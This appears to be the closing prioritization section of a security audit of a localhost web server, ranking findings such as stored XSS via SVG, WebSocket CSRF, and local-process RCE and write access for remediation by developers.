1. **Immediate action items (exploitable by a malicious webpage open in the same browser):** S06 (stored XSS via SVG), S03 (WebSocket CSRF data exfil).
2. **If `allow_code_execution: true`:** S01 becomes critical — any local process has RCE.
3. **Data integrity threats (writable without auth by any local process):** S01. If malware runs on the machine, it can modify all pages, push to remote git, and delete files.
4. **If the server is ever exposed beyond localhost:** S01, S17, S18 become critical.

---

_End of report. No fixes were implemented. All issues are reported for remediation by the development team._
